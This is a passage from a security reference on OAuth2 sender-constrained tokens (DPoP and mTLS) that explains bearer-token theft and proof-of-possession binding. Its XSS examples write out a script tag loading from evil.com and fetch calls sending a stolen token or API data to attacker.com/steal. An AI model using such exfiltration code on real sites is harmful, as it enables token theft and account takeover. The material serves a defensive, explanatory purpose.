# OAuth2 Sender-Constrained Tokens: DPoP and mTLS

## Complete Technical Reference for Proof-of-Possession Token Security

> *"Bearer tokens are a bit like those 'Admit One' tickets to theme parks that say 'non-transferable' in tiny print nobody reads. In theory, only you should use them. In practice, anyone who finds your ticket in the parking lot can waltz right in and enjoy the rides. Sender-constrained tokens, on the other hand, are more like a biometric ticket scanner that checks your thumbprint. Sure, someone could steal your ticket, but without your actual thumb attached, they're just holding an expensive piece of plastic. The universe has a way of teaching us that 'possession equals authorization' is a terrible security model, usually by letting attackers possess all our valuable things."*

---

## Document Metadata

**Topic:** Sender-Constrained Access Tokens  
**Primary Mechanisms:** DPoP (RFC 9449), mTLS (RFC 8705)  
**Security Goal:** Cryptographically bind tokens to clients  
**Primary RFCs:** RFC 9449 (DPoP), RFC 8705 (mTLS), RFC 7800 (PoP)  
**Problem Solved:** Bearer token theft and replay attacks  
**Version:** 1.0.0  
**Last Updated:** December 8, 2025  

**Target Audience:**
- Security architects implementing high-security OAuth2 systems
- Developers working with financial services APIs
- Healthcare application security teams
- Zero-trust architecture implementers
- Security professionals preventing token theft

**Prerequisites:**
- Understanding of OAuth 2.0 authorization code flow
- Knowledge of JWT structure and validation
- Basic cryptography concepts (public/private keys, digital signatures)
- TLS/SSL fundamentals
- Understanding of access token lifecycle

**Related Documentation:**
- [OAuth2/OIDC Threat Model](./oauth2-oidc-threat-model-INDEX.md) - Token theft attacks
- [Access Tokens](../tokens/access-tokens.md) - Token fundamentals
- [JWT Structure and Validation](../tokens/jwt-structure-and-validation.md) - JWT details
- [PKCE Implementation](./pkce-implementation.md) - Code binding concepts

---

## Table of Contents

1. [Overview](#1-overview)
2. [Bearer Token Security Model](#2-bearer-token-security-model)
3. [Proof-of-Possession Concept](#3-proof-of-possession-concept)
4. [DPoP Overview](#4-dpop-overview)
5. [DPoP Protocol Flow](#5-dpop-protocol-flow)
6. [DPoP Proof JWT Structure](#6-dpop-proof-jwt-structure)
7. [DPoP Proof Generation](#7-dpop-proof-generation)
8. [DPoP Proof Validation](#8-dpop-proof-validation)
9. [DPoP Replay Protection](#9-dpop-replay-protection)
10. [mTLS Overview](#10-mtls-overview)
11. [mTLS Protocol Flow](#11-mtls-protocol-flow)
12. [mTLS Certificate Binding](#12-mtls-certificate-binding)
13. [DPoP vs mTLS Comparison](#13-dpop-vs-mtls-comparison)
14. [Security Benefits](#14-security-benefits)
15. [Performance Considerations](#15-performance-considerations)
16. [Implementation Requirements](#16-implementation-requirements)
17. [Common Implementation Errors](#17-common-implementation-errors)
18. [Token Type and Discovery](#18-token-type-and-discovery)
19. [Security Threat Model](#19-security-threat-model)
20. [Example Scenarios](#20-example-scenarios)
21. [Migration Strategies](#21-migration-strategies)

---

## 1. Overview

### 1.1 The Bearer Token Problem

**Bearer Token Definition:**
```
A security token with the property that any party in possession 
of the token (a "bearer") can use the token in any way that any 
other party in possession of it can.

Translation: If you have the token, you can use it. Period.
```

**Bearer Token Model:**
```
┌──────────────────────────────────────────────────────────┐
│  Bearer Token = "Key to the Kingdom"                     │
├──────────────────────────────────────────────────────────┤
│                                                           │
│  Client obtains token:     access_token = "abc123..."    │
│  Client uses token:        Authorization: Bearer abc123  │
│  Resource server checks:   Is token valid?               │
│                           ├─ Yes → Grant access           │
│                           └─ No → Deny access             │
│                                                           │
│  NO ADDITIONAL PROOF REQUIRED                            │
│                                                           │
│  Problem: Anyone with token can use it                   │
│  ├─ Legitimate client? ✓ Can use                         │
│  ├─ Attacker who stole token? ✓ Can use                  │
│  ├─ XSS script? ✓ Can use                                │
│  └─ Malicious insider? ✓ Can use                         │
│                                                           │
│  Bearer token theft = Complete compromise                │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### 1.2 The Solution: Sender-Constrained Tokens

**Sender-Constrained Token Model:**
```
┌──────────────────────────────────────────────────────────┐
│  Sender-Constrained Token = "Key + Your Fingerprint"    │
├──────────────────────────────────────────────────────────┤
│                                                           │
│  Client obtains token bound to cryptographic key         │
│  Token contains: cnf (confirmation) claim                │
│                 ├─ DPoP: JWK thumbprint                  │
│                 └─ mTLS: Certificate thumbprint          │
│                                                           │
│  Client uses token + cryptographic proof:                │
│  ├─ DPoP: JWT signed with private key                    │
│  └─ mTLS: TLS connection with client certificate         │
│                                                           │
│  Resource server checks:                                 │
│  1. Is token valid? ✓                                    │
│  2. Does proof match token binding? ✓                    │
│  3. Is proof signed with correct key? ✓                  │
│                                                           │
│  Both token AND proof required                           │
│                                                           │
│  Token theft without private key:                        │
│  ├─ Attacker has token: ✓                                │
│  ├─ Attacker has private key: ✗                          │
│  └─ Attacker can use token: ✗ (proof generation fails)   │
│                                                           │
│  Result: Token is useless without private key            │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### 1.3 Two Primary Mechanisms

**DPoP (Demonstrating Proof-of-Possession) - RFC 9449:**
```
Layer:          Application layer (HTTP headers)
Binding:        Token contains JWK thumbprint
Proof:          Signed JWT in DPoP header
Key Management: Ad-hoc or managed
Support:        Browsers, mobile, servers
Complexity:     Moderate
RFC:            RFC 9449 (September 2023)
```

**mTLS (Mutual TLS Client Certificates) - RFC 8705:**
```
Layer:          Transport layer (TLS)
Binding:        Token contains certificate thumbprint
Proof:          Client certificate in TLS handshake
Key Management: PKI infrastructure (X.509)
Support:        Backend services, enterprise
Complexity:     High
RFC:            RFC 8705 (February 2020)
```

### 1.4 Use Cases for Sender-Constrained Tokens

**High-Security Scenarios:**

**1. Financial Services:**
```
Use Case: Banking APIs, payment processing
Requirements:
- High-value transactions
- Regulatory compliance (PSD2, PCI DSS)
- Strong customer authentication
- Prevention of token theft

Solution: DPoP or mTLS depending on client type
- Mobile banking apps: DPoP
- Backend payment processors: mTLS
```

**2. Healthcare:**
```
Use Case: Medical records access, FHIR APIs
Requirements:
- HIPAA compliance
- PHI (Protected Health Information) access
- Audit trail
- Patient data protection

Solution: DPoP for web/mobile, mTLS for B2B
```

**3. Zero-Trust Architectures:**
```
Use Case: Service mesh, microservices
Requirements:
- Never trust, always verify
- Service-to-service authentication
- Lateral movement prevention
- Cryptographic identity

Solution: mTLS for service mesh (Istio, Linkerd)
```

**4. Government and Defense:**
```
Use Case: Classified systems, secure communications
Requirements:
- Top Secret/Sensitive clearances
- Compartmentalized access
- Cryptographic authentication
- No bearer credential risk

Solution: mTLS with hardware security modules
```

**5. High-Value APIs:**
```
Use Case: Trading platforms, cryptocurrency exchanges
Requirements:
- Large financial transactions
- Real-time trading
- Account security
- Fraud prevention

Solution: DPoP for user-facing, mTLS for backend
```

### 1.5 Adoption Status

**Current State (2025):**
```
DPoP:
- Specification: RFC 9449 (Published 2023)
- Status: Growing adoption
- Support: Major OAuth providers adding support
- Libraries: Available for most languages

mTLS:
- Specification: RFC 8705 (Published 2020)
- Status: Mature, widely deployed
- Support: Enterprise-ready
- Use: Banking, B2B, government

Industry Trend:
- Moving from bearer tokens for sensitive operations
- DPoP gaining momentum for user-facing apps
- mTLS remains standard for backend services
```

### 1.6 Standards References

| RFC | Title | Relevance |
|-----|-------|-----------|
| **RFC 9449** | OAuth 2.0 Demonstrating Proof-of-Possession (DPoP) | Primary DPoP specification |
| **RFC 8705** | OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound Access Tokens | Primary mTLS specification |
| **RFC 7800** | Proof-of-Possession Key Semantics for JSON Web Tokens (JWTs) | Confirmation claim structure |
| **RFC 7515** | JSON Web Signature (JWS) | DPoP proof signing |
| **RFC 7517** | JSON Web Key (JWK) | Public key representation |
| **RFC 5280** | X.509 PKI Certificate Profile | mTLS certificates |
| **RFC 6749** | OAuth 2.0 Authorization Framework | Base OAuth2 |

---

## 2. Bearer Token Security Model (Current Default)

### 2.1 How Bearer Tokens Work

**OAuth 2.0 Bearer Token Flow:**

```
┌─────────┐                                    ┌─────────────────┐
│ Client  │                                    │ Authorization   │
│         │                                    │ Server          │
└────┬────┘                                    └────────┬────────┘
     │                                                  │
     │ 1. Authorization Request                        │
     │────────────────────────────────────────────────>│
     │                                                  │
     │                        2. User Authentication   │
     │                           & Authorization       │
     │                                                  │
     │ 3. Authorization Code                           │
     │<────────────────────────────────────────────────│
     │                                                  │
     │ 4. Token Request (code + client credentials)    │
     │────────────────────────────────────────────────>│
     │                                                  │
     │ 5. Access Token (Bearer)                        │
     │    { "access_token": "abc123...",               │
     │      "token_type": "Bearer" }                   │
     │<────────────────────────────────────────────────│
     │                                                  │
┌────┴────┐                                    ┌────────────────┐
│ Client  │                                    │ Resource       │
│         │                                    │ Server         │
└────┬────┘                                    └────────┬───────┘
     │                                                  │
     │ 6. Resource Request                             │
     │    Authorization: Bearer abc123...              │
     │────────────────────────────────────────────────>│
     │                                                  │
     │                              7. Token Validation│
     │                                 ├─ Valid token? │
     │                                 ├─ Not expired? │
     │                                 └─ Has scope?   │
     │                                                  │
     │ 8. Resource Response                            │
     │<────────────────────────────────────────────────│
     │                                                  │
     
     
Key Characteristic: 
Only token is required - no additional proof needed
Anyone with token can use it (bearer credential)
```

**Bearer Token in HTTP:**
```http
GET /api/resource HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

↑
This is ALL the resource server needs
- Token is presented
- Token is validated
- If valid → Access granted
- No proof of possession
```

### 2.2 Bearer Token Vulnerabilities

**Vulnerability 1: Token Theft via XSS**

```
Attack Scenario:
┌──────────────────────────────────────────────────────┐
│  Web Application with XSS Vulnerability              │
├──────────────────────────────────────────────────────┤
│                                                       │
│  1. User authenticates, obtains bearer token         │
│     Token stored: localStorage.token = "abc123..."   │
│                                                       │
│  2. User visits page with XSS vulnerability          │
│     Attacker injects: <script src="evil.com/xss.js"> │
│                                                       │
│  3. Malicious script executes in user's browser      │
│     var token = localStorage.getItem('token');       │
│     fetch('https://attacker.com/steal?t=' + token);  │
│                                                       │
│  4. Attacker receives bearer token                   │
│     Attacker's server logs: abc123...                │
│                                                       │
│  5. Attacker uses stolen token                       │
│     curl -H "Authorization: Bearer abc123..." \      │
│          https://api.example.com/resource            │
│                                                       │
│  6. Resource server validates token                  │
│     Token is valid ✓                                 │
│     Not expired ✓                                    │
│     Has required scope ✓                             │
│                                                       │
│  7. Attack succeeds - access granted                 │
│                                                       │
│  Result: Complete account compromise                 │
│          Attacker has full API access                │
│          Until token expires (often hours)           │
│                                                       │
└──────────────────────────────────────────────────────┘
```

**Vulnerability 2: Token Theft via Insecure Storage**

```
Attack Vectors:
1. Local Storage (localStorage):
   - Accessible to all JavaScript (including XSS)
   - No HttpOnly protection
   - Survives page refresh
   - Common storage location (easy target)

2. Session Storage (sessionStorage):
   - Same vulnerabilities as localStorage
   - Only lasts for session
   - Still accessible to XSS

3. Cookies without HttpOnly:
   - Accessible to JavaScript
   - Can be stolen via XSS
   - May be sent cross-origin

4. Mobile App Insecure Storage:
   - Shared preferences (Android) without encryption
   - UserDefaults (iOS) without keychain
   - Accessible if device compromised
   - Backup files may contain tokens

5. Desktop App Storage:
   - Configuration files
   - Environment variables
   - Plain text storage
   - Accessible to malware

Attack: Once storage is accessed, token is stolen
Result: Token can be used from any location
```

**Vulnerability 3: Network Interception**

```
Scenario 1: TLS Downgrade Attack
┌─────────────────────────────────────┐
│  If TLS is compromised:             │
│  ├─ SSL stripping                   │
│  ├─ Certificate pinning bypass      │
│  ├─ Compromised CA                  │
│  └─ Implementation vulnerabilities  │
│                                     │
│  Result: Bearer token transmitted   │
│          in clear text              │
│          Can be intercepted         │
└─────────────────────────────────────┘

Scenario 2: Man-in-the-Middle (MITM)
- Attacker intercepts HTTPS connection
- Steals bearer token from HTTP headers
- Uses token from attacker's system
- Victim may not even notice

Note: TLS protects in transit, but:
- Token still vulnerable at endpoints
- Token can be stolen from logs
- Token can be stolen from memory
```

**Vulnerability 4: Token Replay**

```
Token Lifetime Problem:
┌──────────────────────────────────────────┐
│  Bearer Token Issued: 10:00 AM          │
│  Token Expires: 12:00 PM (2 hours)      │
│                                          │
│  10:01 AM - Token stolen via XSS        │
│  10:02 AM - Attacker uses token ✓       │
│  10:30 AM - Attacker uses token ✓       │
│  11:00 AM - Attacker uses token ✓       │
│  11:30 AM - Attacker uses token ✓       │
│  11:59 AM - Attacker uses token ✓       │
│  12:00 PM - Token expires               │
│                                          │
│  Window of exposure: 2 hours            │
│  (or longer if token lifetime is long)  │
│                                          │
│  During this window:                    │
│  - Legitimate client can use token      │
│  - Attacker can use token               │
│  - No way to distinguish                │
│  - No way to revoke (unless stored)     │
└──────────────────────────────────────────┘
```

### 2.3 Existing Mitigations (Insufficient)

**Mitigation 1: TLS (Transport Layer Security)**

```
Protection: Encrypts token in transit
Status: ✓ Prevents network interception (when working)

Limitations:
✗ Doesn't protect token at endpoints
✗ Token visible in client memory
✗ Token visible in server logs (if logged)
✗ Token can be stolen from storage
✗ Token can be exfiltrated via XSS

Conclusion: TLS is necessary but NOT sufficient
```

**Mitigation 2: Short Token Lifetime**

```
Strategy: Issue tokens with short expiration (e.g., 5-15 minutes)

Benefits:
✓ Limits exposure window
✓ Reduces damage from theft
✓ Forces frequent re-authentication

Limitations:
✗ Token still usable during lifetime
✗ User experience impact (frequent re-auth)
✗ Doesn't prevent theft, only limits time
✗ Refresh tokens become target (often long-lived)
✗ 5 minutes is still a long time for automated attacks

Example Attack:
- Token stolen at 10:00:00 AM
- Token expires at 10:05:00 AM
- Attacker has 5 minutes
- Automated script can exfiltrate significant data
  in 5 minutes
```

**Mitigation 3: Secure Storage**

```
Best Practices:
1. Cookies with HttpOnly + Secure + SameSite
2. Mobile: Keychain (iOS), Keystore (Android)
3. Desktop: OS credential manager

Benefits:
✓ Reduces XSS attack surface
✓ OS-level protection

Limitations:
✗ Not foolproof (XSS can still extract via requests)
✗ Doesn't protect against malware
✗ Doesn't protect against compromised backend
✗ Token still usable if stolen by any means

Example XSS Bypass:
// Even with HttpOnly cookies:
fetch('/api/resource')
  .then(r => r.json())
  .then(data => {
    // Exfiltrate data instead of token
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });

Token may be protected, but attacker can still
proxy requests and steal data
```

**Mitigation 4: Token Rotation**

```
Strategy: Issue new token on each request

Benefits:
✓ Short-lived tokens
✓ Single-use tokens

Limitations:
✗ High complexity
✗ Race conditions
✗ Doesn't prevent theft, only limits reuse
✗ Token still usable once before rotation

Conclusion: Better than static tokens, but still vulnerable
```

### 2.4 Why Bearer Tokens Remain Standard

**Despite vulnerabilities, bearer tokens are widely used:**

```
Advantages:
✓ Simplicity
  - Easy to implement
  - Easy to understand
  - Minimal infrastructure

✓ Wide Support
  - Every OAuth library supports bearer tokens
  - Every HTTP client supports bearer tokens
  - Industry standard

✓ Performance
  - No additional crypto operations
  - No key management overhead
  - Fast validation

✓ Acceptable Risk for Many Use Cases
  - Public social media APIs
  - Low-value operations
  - Read-only access
  - Combined with other controls (TLS, short lifetime)

When Bearer Tokens are Adequate:
- Non-sensitive data
- Low-value transactions
- Strong complementary controls
- Acceptable risk profile
```

### 2.5 When Sender-Constraint is Needed

**High-Risk Scenarios Requiring Proof-of-Possession:**

```
Criteria for Sender-Constrained Tokens:

1. High-Value Transactions
   - Financial transfers
   - Large purchases
   - Sensitive operations
   - Example: Bank transfers >$10,000

2. Regulated Industries
   - Finance: PSD2, PCI DSS, SOX
   - Healthcare: HIPAA, HITECH
   - Government: FedRAMP, FISMA
   - Example: Medical record access

3. Sensitive Personal Data
   - PHI (Protected Health Information)
   - PII (Personally Identifiable Information)
   - Financial records
   - Example: Tax returns, medical history

4. Zero-Trust Architectures
   - Service mesh security
   - Microservices authentication
   - Lateral movement prevention
   - Example: Kubernetes service-to-service

5. Elevated Privileges
   - Administrative operations
   - Account modifications
   - Security-sensitive actions
   - Example: Password reset, account deletion

6. Long-Lived Tokens
   - Refresh tokens
   - Long sessions
   - Persistent access
   - Example: 30-day API keys

7. Defense in Depth
   - Multiple layers of security
   - Compensating controls
   - Security paranoia
   - Example: "Because we can"

Risk Assessment Formula:
Risk = (Value of Protected Resource) × (Probability of Token Theft)

If Risk > Acceptable_Threshold:
    Use Sender-Constrained Tokens
```

---

## 3. Proof-of-Possession (PoP) Concept

### 3.1 Core Idea

**Cryptographic Binding:**
```
Traditional Bearer Token:
┌────────────────────────────────────┐
│  Token = "abc123..."               │
│                                    │
│  Anyone with token can use it      │
│  No binding to client              │
│  Theft = Full compromise           │
└────────────────────────────────────┘

Proof-of-Possession Token:
┌────────────────────────────────────┐
│  Token = "abc123..." + Key Binding │
│                                    │
│  Token contains reference to:      │
│  - Public key (DPoP)               │
│  - Certificate (mTLS)              │
│                                    │
│  Token alone is insufficient       │
│  Client must prove key possession  │
│  Theft without key = Useless       │
└────────────────────────────────────┘
```

### 3.2 How PoP Tokens Work

**Step-by-Step Process:**

```
1. Client Key Pair Generation:
   ┌─────────────────────────────────┐
   │  Client generates key pair:     │
   │  ├─ Private Key (secret)        │
   │  └─ Public Key (shared)         │
   └─────────────────────────────────┘

2. Token Request with Public Key:
   ┌─────────────────────────────────┐
   │  Client → Authorization Server  │
   │                                 │
   │  "I want a token bound to       │
   │   this public key: <public_key>"│
   │                                 │
   │  Proof: Signature with private  │
   │         key to prove possession │
   └─────────────────────────────────┘

3. Server Issues Bound Token:
   ┌─────────────────────────────────┐
   │  Authorization Server           │
   │                                 │
   │  Access Token:                  │
   │  {                              │
   │    "sub": "user123",            │
   │    "exp": 1735776000,           │
   │    "cnf": {                     │
   │      "jkt": "<key_thumbprint>"  │
   │    }                            │
   │  }                              │
   │                                 │
   │  cnf = confirmation claim       │
   │  jkt = JWK thumbprint (hash of  │
   │        public key)              │
   └─────────────────────────────────┘

4. Resource Request with Proof:
   ┌─────────────────────────────────┐
   │  Client → Resource Server       │
   │                                 │
   │  Token: abc123...               │
   │  Proof: <signed_proof>          │
   │         (signed with private    │
   │          key)                   │
   └─────────────────────────────────┘

5. Server Validates Both:
   ┌─────────────────────────────────┐
   │  Resource Server                │
   │                                 │
   │  1. Validate token ✓            │
   │  2. Extract cnf claim ✓         │
   │  3. Validate proof signature ✓  │
   │  4. Calculate key thumbprint ✓  │
   │  5. Compare thumbprints ✓       │
   │                                 │
   │  If all match → Grant access    │
   └─────────────────────────────────┘
```

### 3.3 Security Properties

**Why PoP Tokens are More Secure:**

```
Property 1: Cryptographic Binding
┌────────────────────────────────────┐
│  Token mathematically bound to key │
│  Cannot use token without key      │
│  Binding verified by crypto, not   │
│  trust                             │
└────────────────────────────────────┘

Property 2: Private Key Never Transmitted
┌────────────────────────────────────┐
│  Private key stays on client       │
│  Only public key shared            │
│  Only signatures transmitted       │
│  Network interception insufficient │
└────────────────────────────────────┘

Property 3: Proof is Request-Specific
┌────────────────────────────────────┐
│  DPoP: Proof includes target URI,  │
│        HTTP method, timestamp      │
│  Each proof is unique              │
│  Replay attacks prevented          │
└────────────────────────────────────┘

Property 4: Non-Transferable
┌────────────────────────────────────┐
│  Token bound to specific key pair  │
│  Cannot transfer to another client │
│  Attacker cannot generate valid    │
│  proof without private key         │
└────────────────────────────────────┘
```

### 3.4 Attack Resistance

**Token Theft Scenarios:**

```
Scenario 1: XSS Attack Steals Token
─────────────────────────────────────
Bearer Token:
1. Attacker steals token via XSS
2. Attacker uses token ✓
3. Attack succeeds

PoP Token (DPoP):
1. Attacker steals token via XSS
2. Attacker tries to use token
3. Cannot generate valid DPoP proof
   (private key not in JavaScript scope)
4. Request rejected ✗
5. Attack fails

PoP Token (mTLS):
1. Attacker steals token via XSS
2. Attacker tries to use token
3. Cannot establish mTLS connection
   (no client certificate)
4. Connection rejected ✗
5. Attack fails


Scenario 2: Insecure Storage
─────────────────────────────────────
Bearer Token:
1. Token stored in localStorage
2. Malware reads localStorage
3. Malware uses token ✓
4. Attack succeeds

PoP Token:
1. Token stored in localStorage
2. Private key in hardware security module
3. Malware reads token
4. Malware cannot access private key
5. Cannot generate valid proof ✗
6. Attack fails


Scenario 3: Network Interception
─────────────────────────────────────
Bearer Token (if TLS compromised):
1. MITM intercepts bearer token
2. MITM uses token ✓
3. Attack succeeds

PoP Token (DPoP):
1. MITM intercepts token + DPoP proof
2. DPoP proof is single-use (unique jti)
3. DPoP proof tied to original request
   (htm, htu)
4. Cannot replay proof for new request ✗
5. Attack fails (limited replay)

PoP Token (mTLS):
1. MITM intercepts token
2. Token bound to client certificate
3. MITM doesn't have certificate
4. Cannot establish mTLS connection ✗
5. Attack fails
```

### 3.5 Trade-Offs

**Advantages:**
```
✓ Strong security against token theft
✓ Cryptographic binding (not trust-based)
✓ Prevents replay attacks
✓ Defense in depth
✓ Suitable for high-security scenarios
```

**Disadvantages:**
```
✗ Increased complexity
  - Client must manage key pairs
  - Additional crypto operations
  - More implementation code

✗ Performance overhead
  - Signature generation
  - Signature verification
  - Key lookups

✗ Infrastructure requirements
  - DPoP: Key storage, crypto library
  - mTLS: PKI infrastructure, certificates

✗ Debugging difficulty
  - More moving parts
  - Crypto errors harder to diagnose
  - Cannot replay requests without keys

✗ Limited library support (improving)
  - Bearer tokens: Universal
  - PoP tokens: Growing but not universal
```

### 3.6 Confirmation (cnf) Claim Structure

**RFC 7800 - Proof-of-Possession Key Semantics:**

**cnf Claim in Access Token:**
```json
{
  "iss": "https://auth.example.com",
  "sub": "user123",
  "aud": "https://api.example.com",
  "exp": 1735776000,
  "iat": 1735772400,
  "scope": "read write",
  
  "cnf": {
    "jkt": "0ZcOCORZNYy-DWpqq30jZyJGHTN0d2HglBV3uiguA4I"
  }
}
```

**cnf Claim Properties:**

```
cnf (confirmation) claim:
├─ Purpose: Bind token to cryptographic key
├─ Location: Inside access token JWT
├─ Format: JSON object
└─ Content: Key identification

For DPoP (RFC 9449):
{
  "cnf": {
    "jkt": "<base64url(sha256(jwk))>"
  }
}
- jkt = JWK SHA-256 Thumbprint (RFC 7638)
- Hash of public key in JWK format
- 256-bit value, base64url encoded

For mTLS (RFC 8705):
{
  "cnf": {
    "x5t#S256": "<base64url(sha256(cert))>"
  }
}
- x5t#S256 = X.509 Certificate SHA-256 Thumbprint
- Hash of DER-encoded certificate
- 256-bit value, base64url encoded
```

**Validation Process:**
```
Resource Server:
1. Decode access token JWT
2. Extract cnf claim
3. For DPoP:
   - Extract public key from DPoP proof
   - Calculate SHA-256(JWK)
   - Compare with cnf.jkt
4. For mTLS:
   - Extract certificate from TLS connection
   - Calculate SHA-256(certificate)
   - Compare with cnf.x5t#S256
5. If match: Key binding verified ✓
6. If mismatch: Reject request ✗
```

---

## 4. DPoP Overview (RFC 9449)

### 4.1 What is DPoP?

**DPoP (Demonstrating Proof-of-Possession):**
```
Definition: Application-layer mechanism for sender-constraining 
           OAuth 2.0 tokens via HTTP header-based proof

Key Characteristics:
├─ Layer: Application (HTTP headers)
├─ Proof: Signed JWT in DPoP header
├─ Binding: JWK thumbprint in token cnf claim
├─ Keys: Asymmetric key pair (RSA or ECDSA)
└─ Scope: Per-request proof generation

RFC: RFC 9449 (September 2023)
Status: Standards Track
```

### 4.2 DPoP Advantages

**Compared to mTLS:**

```
✓ No TLS Infrastructure Required
  - No certificate authority needed
  - No certificate issuance process
  - No certificate revocation infrastructure

✓ Browser Support
  - Works in web browsers
  - JavaScript can generate proofs
  - Web Crypto API support

✓ Flexible Key Management
  - Ad-hoc key generation
  - Application-managed keys
  - Can use existing keys or generate new ones

✓ Easier Deployment
  - No TLS configuration changes
  - Application-layer only
  - No load balancer changes needed

✓ Better for Mobile Apps
  - No client certificate provisioning
  - Easier key rotation
  - Better user experience

✓ Simpler Testing
  - No certificate setup for dev/test
  - Can test with curl + key generation
  - Easier local development
```

### 4.3 DPoP Use Cases

**Ideal Scenarios:**

```
1. Web Applications (SPAs)
   - React, Angular, Vue apps
   - JavaScript can generate DPoP proofs
   - No browser certificate management

2. Mobile Applications
   - iOS, Android apps
   - Native crypto libraries
   - User-friendly (no cert UX)

3. Public APIs
   - Third-party developers
   - Reduced infrastructure burden
   - Easier onboarding

4. Microservices (Application Layer)
   - Service-to-service auth
   - Complementary to service mesh
   - Application-level identity

5. High-Security Scenarios without PKI
   - Financial APIs
   - Healthcare apps
   - When mTLS PKI not available
```

### 4.4 DPoP Components

**Key Components:**

```
1. DPoP Key Pair:
   ┌─────────────────────────────────┐
   │  Private Key (client-side)      │
   │  - RSA 2048+ or ECDSA P-256     │
   │  - Never transmitted            │
   │  - Used to sign DPoP proofs     │
   └─────────────────────────────────┘
   
   ┌─────────────────────────────────┐
   │  Public Key (shared)            │
   │  - JWK format                   │
   │  - Included in DPoP proof       │
   │  - Used for verification        │
   └─────────────────────────────────┘

2. DPoP Proof JWT:
   ┌─────────────────────────────────┐
   │  Header:                        │
   │  - typ: "dpop+jwt"              │
   │  - alg: "ES256" or "RS256"      │
   │  - jwk: <public_key>            │
   │                                 │
   │  Payload:                       │
   │  - jti: <unique_id>             │
   │  - htm: <http_method>           │
   │  - htu: <http_uri>              │
   │  - iat: <timestamp>             │
   │  - ath: <token_hash> (optional) │
   │                                 │
   │  Signature:                     │
   │  - Signed with private key      │
   └─────────────────────────────────┘

3. DPoP Header:
   ┌─────────────────────────────────┐
   │  HTTP Header:                   │
   │  DPoP: <dpop_proof_jwt>         │
   │                                 │
   │  Sent with:                     │
   │  - Token requests               │
   │  - Resource requests            │
   └─────────────────────────────────┘

4. Bound Access Token:
   ┌─────────────────────────────────┐
   │  Access Token JWT:              │
   │  {                              │
   │    "sub": "user123",            │
   │    "cnf": {                     │
   │      "jkt": "<jwk_thumbprint>"  │
   │    }                            │
   │  }                              │
   │                                 │
   │  Token type: "DPoP"             │
   │  Authorization: DPoP <token>    │
   └─────────────────────────────────┘
```

### 4.5 DPoP Security Properties

**Security Guarantees:**

```
Property 1: Token-Key Binding
- Access token contains JWK thumbprint (cnf.jkt)
- DPoP proof contains public key (header.jwk)
- Server verifies thumbprint matches
- Result: Token bound to specific key pair

Property 2: Request Binding
- DPoP proof includes target URI (htu)
- DPoP proof includes HTTP method (htm)
- Server validates against actual request
- Result: Proof cannot be reused for different endpoint

Property 3: Replay Protection
- DPoP proof includes unique jti (JWT ID)
- DPoP proof includes timestamp (iat)
- Server tracks jti values
- Result: Each proof is single-use

Property 4: Token Binding (ath claim)
- DPoP proof includes token hash (ath)
- Server validates hash matches token
- Result: Proof bound to specific token

Property 5: Signature Verification
- DPoP proof signed with private key
- Server verifies with public key from proof
- Result: Proof authenticity guaranteed
```

---

## 5. DPoP Protocol Flow (RFC 9449 §4)

### 5.1 Complete DPoP Flow

**End-to-End DPoP Process:**

```
┌──────────────────────────────────────────────────────────────────┐
│               DPoP Authorization Code Flow                        │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  STEP 1: Client Generates DPoP Key Pair                          │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Client:                                                          │
│  ┌──────────────────────────────────────────────────┐           │
│  │ key_pair = generate_keypair(algorithm="ES256")   │           │
│  │                                                  │           │
│  │ private_key = key_pair.private  // Keep secret  │           │
│  │ public_key = key_pair.public    // Will share   │           │
│  │                                                  │           │
│  │ // Convert public key to JWK format             │           │
│  │ public_jwk = to_jwk(public_key)                 │           │
│  └──────────────────────────────────────────────────┘           │
│                                                                   │
│                                                                   │
│  STEP 2: Authorization Request (Standard OAuth)                  │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Client → Authorization Server:                                  │
│  GET /authorize?                                                 │
│    response_type=code&                                           │
│    client_id=abc123&                                             │
│    redirect_uri=https://client.com/callback&                     │
│    scope=read&                                                   │
│    state=xyz789                                                  │
│                                                                   │
│  // No DPoP yet - standard OAuth authorization                   │
│                                                                   │
│                                                                   │
│  STEP 3: User Authentication & Authorization (Standard)          │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  User authenticates, grants consent                              │
│                                                                   │
│  Authorization Server → Client:                                  │
│  302 Found                                                       │
│  Location: https://client.com/callback?                          │
│            code=AUTH_CODE&                                       │
│            state=xyz789                                          │
│                                                                   │
│                                                                   │
│  STEP 4: Token Request with DPoP Proof                           │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Client creates DPoP proof for token endpoint:                   │
│  ┌────────────────────────────────────────────────────────┐     │
│  │ dpop_proof = create_jwt({                              │     │
│  │   header: {                                            │     │
│  │     typ: "dpop+jwt",                                   │     │
│  │     alg: "ES256",                                      │     │
│  │     jwk: public_jwk  // Include public key            │     │
│  │   },                                                   │     │
│  │   payload: {                                           │     │
│  │     jti: "e1j3V_bKic8-aLOBP-y7",  // Unique ID        │     │
│  │     htm: "POST",                    // HTTP method     │     │
│  │     htu: "https://auth.example.com/token", // Target  │     │
│  │     iat: 1735776000                 // Timestamp       │     │
│  │   }                                                    │     │
│  │ }, private_key)  // Sign with private key             │     │
│  └────────────────────────────────────────────────────────┘     │
│                                                                   │
│  Client → Authorization Server:                                  │
│  POST /token HTTP/1.1                                            │
│  Host: auth.example.com                                          │
│  Content-Type: application/x-www-form-urlencoded                 │
│  DPoP: <dpop_proof_jwt>  ← DPoP proof in header                 │
│                                                                   │
│  grant_type=authorization_code&                                  │
│  code=AUTH_CODE&                                                 │
│  redirect_uri=https://client.com/callback&                       │
│  client_id=abc123                                                │
│                                                                   │
│                                                                   │
│  STEP 5: Authorization Server Validates DPoP Proof               │
│  ════════════════════════════════════════════════════════════    │
│                                                                   │
│  Authorization Server:                                           │
│  ┌────────────────────────────────────────────────────────┐     │
│  │ 1. Extract DPoP proof from DPoP header                 │     │
│  │ 2. Decode JWT, extract public key from jwk claim      │     │
│  │ 3. Verify JWT signature with public key               │     │
│  │ 4. Validate typ = "dpop+jwt"                          │     │
│  │ 5. Validate htm = "POST"                              │     │
│  │ 6. Validate htu = "https://auth.example.com/token"    │     │
